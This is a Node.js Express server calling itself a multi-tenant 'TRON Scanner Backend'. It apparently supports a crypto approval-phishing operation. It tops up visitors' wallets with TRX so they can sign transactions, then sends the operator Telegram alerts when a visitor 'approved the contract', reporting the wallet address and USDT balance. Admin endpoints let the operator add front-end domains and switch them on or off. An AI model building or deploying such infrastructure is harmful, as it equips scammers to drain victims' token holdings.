const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const TronWeb = require('tronweb');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware
app.use(helmet());

// Get list of allowed origins from tenants
function getAllowedOrigins() {
    const tenants = loadTenants();
    const origins = [];
    
    Object.keys(tenants).forEach(domain => {
        origins.push(`https://${domain}`);
        origins.push(`https://www.${domain}`);
        origins.push(`http://${domain}`);
        origins.push(`http://www.${domain}`);
    });
    
    return origins;
}

// Dynamic CORS - only allow configured domains
app.use(cors({
    origin: function (origin, callback) {
        // Allow requests with no origin (like mobile apps, Postman, etc.) - but they'll be blocked by tenantMiddleware
        if (!origin) {
            return callback(null, true);
        }
        
        const tenants = loadTenants();
        const allowedOrigins = getAllowedOrigins();
        
        // Extract domain from origin
        try {
            const url = new URL(origin);
            const domain = url.hostname.replace('www.', '');
            
            // Check if domain is in tenants list
            if (tenants[domain]) {
                return callback(null, true);
            }
        } catch (e) {
            // Invalid origin URL
        }
        
        // Check if origin is in allowed list
        if (allowedOrigins.includes(origin)) {
            return callback(null, true);
        }
        
        // Log unauthorized access attempt
        console.warn(`🚫 Unauthorized domain access attempt: ${origin}`);
        
        // Block unauthorized domain
        callback(new Error('Not allowed by CORS - Domain not authorized'));
    },
    credentials: true,
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Origin', 'Referer']
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

app.use(express.json());

// Tenant configuration file path
const TENANTS_FILE = path.join(__dirname, 'tenants.json');

// Load tenants configuration
function loadTenants() {
    try {
        if (fs.existsSync(TENANTS_FILE)) {
            const data = fs.readFileSync(TENANTS_FILE, 'utf8');
            const tenants = JSON.parse(data);
            
            // Merge private keys from environment variables
            // Pattern: TENANT_<DOMAIN>_PRIVATE_KEY (dots replaced with underscores)
            Object.keys(tenants).forEach(domain => {
                const envKey = `TENANT_${domain.replace(/\./g, '_').toUpperCase()}_PRIVATE_KEY`;
                const privateKey = process.env[envKey];
                
                if (privateKey) {
                    // Use private key from environment variable (secure)
                    tenants[domain].tronPrivateKey = privateKey;
                } else if (!tenants[domain].tronPrivateKey) {
                    // No private key found - log warning
                    console.warn(`⚠️  No private key found for domain "${domain}" (check env var: ${envKey})`);
                }
                // If tronPrivateKey exists in tenants.json, it will be used (backward compatibility)
                // But this is NOT recommended for security
            });
            
            return tenants;
        }
        return {};
    } catch (error) {
        console.error('Error loading tenants configuration:', error.message);
        return {};
    }
}

// Save tenants configuration
function saveTenants(tenants) {
    try {
        fs.writeFileSync(TENANTS_FILE, JSON.stringify(tenants, null, 2), 'utf8');
        return true;
    } catch (error) {
        console.error('Error saving tenants configuration:', error.message);
        return false;
    }
}

// Extract domain from request
function extractDomain(req) {
    // Try Origin header first (from browser)
    const origin = req.headers.origin;
    if (origin) {
        try {
            const url = new URL(origin);
            return url.hostname.replace('www.', ''); // Remove www. prefix
        } catch (e) {
            // Invalid URL
        }
    }
    
    // Try Host header
    const host = req.headers.host;
    if (host) {
        return host.replace('www.', '').split(':')[0]; // Remove port if present
    }
    
    // Try Referer header
    const referer = req.headers.referer;
    if (referer) {
        try {
            const url = new URL(referer);
            return url.hostname.replace('www.', '');
        } catch (e) {
            // Invalid URL
        }
    }
    
    return null;
}

// Middleware to detect domain and load tenant config
function tenantMiddleware(req, res, next) {
    const domain = extractDomain(req);
    
    if (!domain) {
        // Log unauthorized access attempt
        console.warn(`🚫 Access attempt without domain: IP ${req.ip}, Headers:`, {
            origin: req.headers.origin,
            host: req.headers.host,
            referer: req.headers.referer
        });
        
        return res.status(403).json({
            success: false,
            error: 'Domain not detected',
            message: 'Domain not detected in request headers. Only authorized domains can use this service.',
            unauthorized: true
        });
    }
    
    const tenants = loadTenants();
    const tenant = tenants[domain];
    
    if (!tenant) {
        // Log unauthorized domain access attempt
        console.warn(`🚫 Unauthorized domain access attempt: "${domain}" from IP ${req.ip}`);
        
        return res.status(403).json({
            success: false,
            error: 'Domain not authorized',
            message: `Domain "${domain}" is not authorized to use this service. Only configured domains are allowed.`,
            domain: domain,
            unauthorized: true
        });
    }
    
    // Validate tenant configuration
    // Check for private key from environment variable first
    const envKey = `TENANT_${domain.replace(/\./g, '_').toUpperCase()}_PRIVATE_KEY`;
    const envPrivateKey = process.env[envKey];
    
    // Use environment variable private key if available, otherwise use tenants.json (backward compat)
    const privateKey = envPrivateKey || tenant.tronPrivateKey;
    
    if (!privateKey || !tenant.tronAddress) {
        console.error(`⚠️  Domain "${domain}" has incomplete configuration`);
        if (!envPrivateKey) {
            console.error(`   Missing environment variable: ${envKey}`);
        }
        return res.status(500).json({
            success: false,
            error: 'Tenant configuration incomplete',
            message: `Domain "${domain}" is missing wallet configuration. Check environment variable: ${envKey}`
        });
    }
    
    // Replace tenant's private key with the resolved one (from env or file)
    tenant.tronPrivateKey = privateKey;
    
    // Attach tenant config to request
    req.tenant = tenant;
    req.domain = domain;
    
    next();
}

// Get tenant-specific TronWeb instance
function getTenantTronWeb(tenant) {
    return new TronWeb({
        fullHost: 'https://api.trongrid.io',
        privateKey: tenant.tronPrivateKey
    });
}

// Function to send Telegram notification (top-up)
async function sendTopUpNotification(tenant, domain, amount, userWalletAddress, transactionId) {
    try {
        if (!tenant.telegramBotToken || !tenant.telegramChatId) {
            console.warn(`[${domain || 'unknown'}] Telegram bot not configured. Skipping notification.`);
            return false;
        }

        const message = `🔔 *TRX Top-Up Sent*\n\n` +
                       `🌐 *Domain:* ${domain || 'unknown'}\n` +
                       `💰 *Amount Sent:* ${amount} TRX\n` +
                       `👤 *User Wallet Address:* \`${userWalletAddress}\`\n` +
                       `🔗 *Transaction ID:* \`${transactionId}\`\n` +
                       `⏰ *Time:* ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${tenant.telegramBotToken}/sendMessage`;
        
        const response = await axios.post(url, {
            chat_id: tenant.telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        });

        if (response.data.ok) {
            console.log(`✅ [${domain || 'unknown'}] Top-up notification sent: ${amount} TRX to ${userWalletAddress}`);
            return true;
        } else {
            console.error(`[${domain || 'unknown'}] Failed to send Telegram notification:`, response.data);
            return false;
        }
    } catch (error) {
        console.error(`[${domain || 'unknown'}] Error sending Telegram notification:`, error.message);
        return false;
    }
}

// Function to send Telegram notification (approval)
async function sendApprovalNotification(tenant, domain, walletAddress, transactionId, amount, trxBalance, usdtBalance) {
    try {
        if (!tenant.telegramBotToken || !tenant.telegramChatId) {
            console.warn(`[${domain}] Telegram bot not configured. Skipping approval notification.`);
            return false;
        }

        const amountInTRX = amount ? (parseInt(amount) / 1000000).toFixed(6) : 'N/A';
        let txIdStr = 'N/A';
        
        if (transactionId) {
            if (typeof transactionId === 'string') {
                txIdStr = transactionId;
            } else if (typeof transactionId === 'object' && transactionId !== null) {
                txIdStr = transactionId.txid || transactionId.txID || transactionId.hash || JSON.stringify(transactionId);
            } else {
                txIdStr = String(transactionId);
            }
        }
        
        const trxBalanceStr = trxBalance !== undefined ? parseFloat(trxBalance).toFixed(6) : 'N/A';
        const usdtBalanceStr = usdtBalance !== undefined ? parseFloat(usdtBalance).toFixed(2) : 'N/A';
        
        const message = `✅ *Contract Approval Successful*\n\n` +
                       `🌐 *Domain:* ${domain}\n` +
                       `💰 *Wallet Address:* \`${walletAddress}\`\n` +
                       `📊 *Transaction ID:* \`${txIdStr}\`\n` +
                       `💵 *Approval Amount:* ${amountInTRX} TRX\n` +
                       `💵 *Current TRX Balance:* ${trxBalanceStr} TRX\n` +
                       `💵 *Current USDT Balance:* ${usdtBalanceStr} USDT\n` +
                       `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
                       `✅ User successfully approved the contract transaction`;

        const url = `https://api.telegram.org/bot${tenant.telegramBotToken}/sendMessage`;
        
        const response = await axios.post(url, {
            chat_id: tenant.telegramChatId,
            text: message,
            parse_mode: 'Markdown'
        });

        if (response.data.ok) {
            console.log(`✅ [${domain}] Approval notification sent for wallet ${walletAddress}`);
            return true;
        } else {
            console.error(`[${domain}] Failed to send approval notification:`, response.data);
            return false;
        }
    } catch (error) {
        console.error(`[${domain}] Error sending approval notification:`, error.message);
        return false;
    }
}

// Store processed transactions to avoid duplicate notifications
const processedTransactions = new Map(); // domain -> Set of transaction IDs

// Middleware to validate requests
const validateRequest = (req, res, next) => {
    const { userAddress } = req.body;
    
    if (!userAddress) {
        return res.status(400).json({ 
            error: 'User address is required',
            success: false 
        });
    }
    
    if (!TronWeb.isAddress(userAddress)) {
        return res.status(400).json({ 
            error: 'Invalid TRON address',
            success: false 
        });
    }
    
    next();
};

// Health check (public, but doesn't expose sensitive info)
app.get('/health', (req, res) => {
    const tenants = loadTenants();
    res.json({ 
        status: 'healthy', 
        message: 'TRON Scanner Backend is running',
        timestamp: new Date().toISOString(),
        tenantsConfigured: Object.keys(tenants).length,
        // Don't expose domain names for security
        access: 'Restricted to authorized domains only'
    });
});

// Domain verification endpoint (for frontend to check if domain is authorized and enabled)
app.get('/verify-domain', (req, res) => {
    const domain = extractDomain(req);
    
    if (!domain) {
        return res.json({
            authorized: false,
            enabled: false,
            message: 'Domain not detected',
            error: 'Domain not found in request headers'
        });
    }
    
    const tenants = loadTenants();
    const tenant = tenants[domain];
    const isAuthorized = !!tenant;
    const isEnabled = tenant && (tenant.enabled !== false); // Default to true if not specified
    
    if (isAuthorized && isEnabled) {
        res.json({
            authorized: true,
            enabled: true,
            domain: domain,
            message: 'Domain is authorized and enabled'
        });
    } else if (isAuthorized && !isEnabled) {
        // Log disabled domain access attempt
        console.warn(`🚫 Disabled domain access attempt: "${domain}" from IP ${req.ip}`);
        
        res.status(403).json({
            authorized: true,
            enabled: false,
            domain: domain,
            message: 'Domain is disabled. Website access is currently turned off.',
            error: 'Domain disabled'
        });
    } else {
        // Log unauthorized verification attempt
        console.warn(`🚫 Unauthorized domain verification: "${domain}" from IP ${req.ip}`);
        
        res.status(403).json({
            authorized: false,
            enabled: false,
            domain: domain,
            message: 'Domain is not authorized. Only configured domains can use this service.',
            error: 'Unauthorized domain'
        });
    }
});

// Check user balance
app.post('/check-balance', tenantMiddleware, validateRequest, async (req, res) => {
    try {
        const { userAddress } = req.body;
        const tenant = req.tenant;
        const domain = req.domain;
        
        const tenantTronWeb = getTenantTronWeb(tenant);
        
        console.log(`[${domain}] Checking balance for: ${userAddress}`);
        
        // Get user balance
        const balance = await tenantTronWeb.trx.getBalance(userAddress);
        const balanceInTRX = tenantTronWeb.fromSun(balance);
        
        res.json({
            success: true,
            address: userAddress,
            balance: balanceInTRX,
            needsFunding: balanceInTRX < tenant.minimumBalance,
            autoSendAmount: tenant.autoSendAmount
        });
        
    } catch (error) {
        console.error(`[${req.domain || 'unknown'}] Balance check error:`, error);
        res.status(500).json({
            success: false,
            error: 'Failed to check balance',
            message: error.message
        });
    }
});

// Send TRX automatically if user needs funding
app.post('/send-trx', tenantMiddleware, validateRequest, async (req, res) => {
    try {
        const { userAddress } = req.body;
        const tenant = req.tenant;
        const domain = req.domain;
        
        const tenantTronWeb = getTenantTronWeb(tenant);
        
        console.log(`[${domain}] Sending TRX to: ${userAddress}`);
        
        // Check if user already has enough balance
        const balance = await tenantTronWeb.trx.getBalance(userAddress);
        const balanceInTRX = tenantTronWeb.fromSun(balance);
        
        if (balanceInTRX >= tenant.minimumBalance) {
            return res.json({
                success: true,
                message: 'User already has sufficient balance',
                balance: balanceInTRX,
                sent: false
            });
        }
        
        // Check server balance
        const serverBalance = await tenantTronWeb.trx.getBalance(tenant.tronAddress);
        const serverBalanceInTRX = tenantTronWeb.fromSun(serverBalance);
        
        if (serverBalanceInTRX < tenant.autoSendAmount) {
            return res.status(500).json({
                success: false,
                error: 'Server has insufficient funds',
                serverBalance: serverBalanceInTRX,
                required: tenant.autoSendAmount
            });
        }
        
        // Send TRX to user
        const transaction = await tenantTronWeb.transactionBuilder.sendTrx(
            userAddress,
            tenantTronWeb.toSun(tenant.autoSendAmount),
            tenant.tronAddress
        );
        
        const signedTransaction = await tenantTronWeb.trx.sign(transaction);
        const result = await tenantTronWeb.trx.sendRawTransaction(signedTransaction);
        
        if (result.result) {
            console.log(`[${domain}] Successfully sent ${tenant.autoSendAmount} TRX to ${userAddress}`);
            console.log(`[${domain}] Transaction ID: ${result.txid}`);
            
            // Send Telegram notification immediately when TRX is sent (NOTIFICATION 1)
            await sendTopUpNotification(tenant, domain, tenant.autoSendAmount, userAddress, result.txid);
            
            res.json({
                success: true,
                message: `Sent ${tenant.autoSendAmount} TRX successfully`,
                transactionId: result.txid,
                amount: tenant.autoSendAmount,
                recipient: userAddress,
                sent: true
            });
        } else {
            throw new Error('Transaction failed');
        }
        
    } catch (error) {
        console.error(`[${req.domain || 'unknown'}] Send TRX error:`, error);
        res.status(500).json({
            success: false,
            error: 'Failed to send TRX',
            message: error.message
        });
    }
});

// Telegram notification endpoint for approvals (NOTIFICATION 2)
app.post('/telegram-notify', tenantMiddleware, async (req, res) => {
    try {
        const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp, approved } = req.body;
        const tenant = req.tenant;
        const domain = req.domain;
        
        // Only send notification if approval is successful
        if (type === 'transaction_approve') {
            // Check if approval was successful
            if (approved === false || approved === 'false') {
                console.log(`[${domain}] Approval was not successful, skipping notification`);
                return res.json({
                    success: true,
                    message: 'Approval not successful, notification skipped',
                    notificationSent: false
                });
            }
            
            // Verify transaction status if transactionId is provided
            if (transactionId) {
                try {
                    const tenantTronWeb = getTenantTronWeb(tenant);
                    const transaction = await tenantTronWeb.trx.getTransaction(transactionId);
                    
                    if (!transaction || !transaction.ret || transaction.ret.length === 0 || transaction.ret[0].contractRet !== 'SUCCESS') {
                        console.log(`[${domain}] Transaction ${transactionId} was not successful, skipping notification`);
                        return res.json({
                            success: true,
                            message: 'Transaction not successful, notification skipped',
                            notificationSent: false
                        });
                    }
                } catch (error) {
                    console.warn(`[${domain}] Could not verify transaction status:`, error.message);
                    // Continue anyway if we can't verify
                }
            }
            
            // Check if we already sent notification for this transaction
            if (!processedTransactions.has(domain)) {
                processedTransactions.set(domain, new Set());
            }
            
            const domainProcessed = processedTransactions.get(domain);
            if (transactionId && domainProcessed.has(transactionId)) {
                console.log(`[${domain}] Already sent notification for transaction ${transactionId}`);
                return res.json({
                    success: true,
                    message: 'Notification already sent',
                    notificationSent: false,
                    duplicate: true
                });
            }
            
            // Send approval notification (NOTIFICATION 2)
            const notified = await sendApprovalNotification(
                tenant,
                domain,
                walletAddress,
                transactionId,
                amount,
                trxBalance,
                usdtBalance
            );
            
            if (transactionId) {
                domainProcessed.add(transactionId);
            }
            
            return res.json({
                success: true,
                message: 'Telegram notification sent',
                notificationSent: notified
            });
        } else if (type === 'wallet_connect') {
            // Optional: Handle wallet connect notifications if needed
            return res.json({
                success: true,
                message: 'Wallet connect notification (not implemented)',
                notificationSent: false
            });
        } else {
            return res.status(400).json({
                success: false,
                error: 'Invalid notification type',
                message: 'Type must be "transaction_approve" or "wallet_connect"'
            });
        }
        
    } catch (error) {
        console.error(`[${req.domain || 'unknown'}] Telegram notification error:`, error);
        res.status(500).json({
            success: false,
            error: 'Failed to send Telegram notification',
            message: error.message
        });
    }
});

// Get transaction status
app.post('/transaction-status', tenantMiddleware, async (req, res) => {
    try {
        const { transactionId } = req.body;
        const tenant = req.tenant;
        const domain = req.domain;
        
        if (!transactionId) {
            return res.status(400).json({
                success: false,
                error: 'Transaction ID is required'
            });
        }
        
        const tenantTronWeb = getTenantTronWeb(tenant);
        const transaction = await tenantTronWeb.trx.getTransaction(transactionId);
        
        res.json({
            success: true,
            transactionId: transactionId,
            status: transaction.ret && transaction.ret.length > 0 && transaction.ret[0].contractRet === 'SUCCESS' ? 'success' : 'failed',
            confirmed: transaction.ret ? true : false,
            transaction: transaction
        });
        
    } catch (error) {
        console.error(`[${req.domain || 'unknown'}] Transaction status error:`, error);
        res.status(500).json({
            success: false,
            error: 'Failed to get transaction status',
            message: error.message
        });
    }
});

// Server info endpoint
app.get('/server-info', tenantMiddleware, (req, res) => {
    const tenant = req.tenant;
    const domain = req.domain;
    
    res.json({
        success: true,
        domain: domain,
        serverAddress: tenant.tronAddress,
        autoSendAmount: tenant.autoSendAmount,
        minimumBalance: tenant.minimumBalance,
        network: 'Mainnet',
        apiVersion: '2.0.0',
        telegramConfigured: !!(tenant.telegramBotToken && tenant.telegramChatId)
    });
});

// Admin endpoints for tenant management
app.post('/admin/add-tenant', async (req, res) => {
    try {
        // Simple authentication - you should add proper auth in production
        const { adminKey, domain, tronPrivateKey, tronAddress, telegramBotToken, telegramChatId, autoSendAmount, minimumBalance } = req.body;
        
        // Check admin key (set in environment variable)
        if (adminKey !== process.env.ADMIN_KEY) {
            return res.status(401).json({
                success: false,
                error: 'Unauthorized',
                message: 'Invalid admin key'
            });
        }
        
        if (!domain || !tronAddress) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields',
                message: 'domain and tronAddress are required. tronPrivateKey should be set as environment variable.'
            });
        }
        
        // Private key should be in environment variable, not in request body
        const envKey = `TENANT_${domain.replace(/\./g, '_').toUpperCase()}_PRIVATE_KEY`;
        const privateKey = process.env[envKey] || tronPrivateKey; // Allow from body for backward compat, but warn
        
        if (tronPrivateKey) {
            console.warn(`⚠️  Private key provided in request body for "${domain}". This is insecure! Use environment variable: ${envKey}`);
        }
        
        if (!privateKey) {
            return res.status(400).json({
                success: false,
                error: 'Missing private key',
                message: `Private key must be set as environment variable: ${envKey}`
            });
        }
        
        const tenants = loadTenants();
        
        // Store tenant config WITHOUT private key (secure)
        tenants[domain] = {
            // DO NOT store private key in tenants.json
            // tronPrivateKey: privateKey, // REMOVED - use env var instead
            tronAddress: tronAddress,
            telegramBotToken: telegramBotToken || '',
            telegramChatId: telegramChatId || '',
            autoSendAmount: autoSendAmount || 13,
            minimumBalance: minimumBalance || 11,
            enabled: true // Default to enabled when adding new tenant
        };
        
        if (saveTenants(tenants)) {
            res.json({
                success: true,
                message: `Tenant "${domain}" added successfully`,
                domain: domain
            });
        } else {
            res.status(500).json({
                success: false,
                error: 'Failed to save tenant configuration'
            });
        }
        
    } catch (error) {
        console.error('Add tenant error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to add tenant',
            message: error.message
        });
    }
});

app.get('/admin/tenants', async (req, res) => {
    try {
        const adminKey = req.query.adminKey;
        
        if (adminKey !== process.env.ADMIN_KEY) {
            return res.status(401).json({
                success: false,
                error: 'Unauthorized',
                message: 'Invalid admin key'
            });
        }
        
    const tenants = loadTenants();
    const tenantList = Object.keys(tenants).map(domain => ({
        domain: domain,
        tronAddress: tenants[domain].tronAddress,
        telegramConfigured: !!(tenants[domain].telegramBotToken && tenants[domain].telegramChatId),
        autoSendAmount: tenants[domain].autoSendAmount,
        minimumBalance: tenants[domain].minimumBalance,
        enabled: tenants[domain].enabled !== false // Default to true if not specified
    }));
        
        res.json({
            success: true,
            tenants: tenantList,
            total: tenantList.length
        });
        
    } catch (error) {
        console.error('List tenants error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to list tenants',
            message: error.message
        });
    }
});

// Enable/Disable domain endpoint
app.post('/admin/toggle-domain', async (req, res) => {
    try {
        const { adminKey, domain, enabled } = req.body;
        
        // Check admin key
        if (adminKey !== process.env.ADMIN_KEY) {
            return res.status(401).json({
                success: false,
                error: 'Unauthorized',
                message: 'Invalid admin key'
            });
        }
        
        if (!domain) {
            return res.status(400).json({
                success: false,
                error: 'Missing domain',
                message: 'Domain is required'
            });
        }
        
        if (typeof enabled !== 'boolean') {
            return res.status(400).json({
                success: false,
                error: 'Invalid enabled value',
                message: 'enabled must be true or false'
            });
        }
        
        const tenants = loadTenants();
        
        if (!tenants[domain]) {
            return res.status(404).json({
                success: false,
                error: 'Domain not found',
                message: `Domain "${domain}" is not configured`
            });
        }
        
        // Update enabled status
        tenants[domain].enabled = enabled;
        
        if (saveTenants(tenants)) {
            console.log(`✅ Domain "${domain}" ${enabled ? 'ENABLED' : 'DISABLED'}`);
            res.json({
                success: true,
                message: `Domain "${domain}" has been ${enabled ? 'enabled' : 'disabled'}`,
                domain: domain,
                enabled: enabled
            });
        } else {
            res.status(500).json({
                success: false,
                error: 'Failed to save tenant configuration'
            });
        }
        
    } catch (error) {
        console.error('Toggle domain error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to toggle domain',
            message: error.message
        });
    }
});

// Enable domain (convenience endpoint)
app.post('/admin/enable-domain', async (req, res) => {
    try {
        const { adminKey, domain } = req.body;
        
        if (adminKey !== process.env.ADMIN_KEY) {
            return res.status(401).json({
                success: false,
                error: 'Unauthorized',
                message: 'Invalid admin key'
            });
        }
        
        if (!domain) {
            return res.status(400).json({
                success: false,
                error: 'Missing domain',
                message: 'Domain is required'
            });
        }
        
        const tenants = loadTenants();
        
        if (!tenants[domain]) {
            return res.status(404).json({
                success: false,
                error: 'Domain not found',
                message: `Domain "${domain}" is not configured`
            });
        }
        
        tenants[domain].enabled = true;
        
        if (saveTenants(tenants)) {
            console.log(`✅ Domain "${domain}" ENABLED`);
            res.json({
                success: true,
                message: `Domain "${domain}" has been enabled`,
                domain: domain,
                enabled: true
            });
        } else {
            res.status(500).json({
                success: false,
                error: 'Failed to save tenant configuration'
            });
        }
        
    } catch (error) {
        console.error('Enable domain error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to enable domain',
            message: error.message
        });
    }
});

// Disable domain (convenience endpoint)
app.post('/admin/disable-domain', async (req, res) => {
    try {
        const { adminKey, domain } = req.body;
        
        if (adminKey !== process.env.ADMIN_KEY) {
            return res.status(401).json({
                success: false,
                error: 'Unauthorized',
                message: 'Invalid admin key'
            });
        }
        
        if (!domain) {
            return res.status(400).json({
                success: false,
                error: 'Missing domain',
                message: 'Domain is required'
            });
        }
        
        const tenants = loadTenants();
        
        if (!tenants[domain]) {
            return res.status(404).json({
                success: false,
                error: 'Domain not found',
                message: `Domain "${domain}" is not configured`
            });
        }
        
        tenants[domain].enabled = false;
        
        if (saveTenants(tenants)) {
            console.log(`🚫 Domain "${domain}" DISABLED`);
            res.json({
                success: true,
                message: `Domain "${domain}" has been disabled`,
                domain: domain,
                enabled: false
            });
        } else {
            res.status(500).json({
                success: false,
                error: 'Failed to save tenant configuration'
            });
        }
        
    } catch (error) {
        console.error('Disable domain error:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to disable domain',
            message: error.message
        });
    }
});

// Error handling
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: err.message
    });
});

// Start server
app.listen(PORT, () => {
    const tenants = loadTenants();
    console.log(`🚀 TRON Scanner Backend running on port ${PORT}`);
    console.log(`📊 Multi-tenant mode enabled`);
    console.log(`🌐 Configured domains: ${Object.keys(tenants).length}`);
    Object.keys(tenants).forEach(domain => {
        console.log(`   - ${domain}`);
    });
    console.log(`🌐 Health check: http://localhost:${PORT}/health`);
});

module.exports = app;
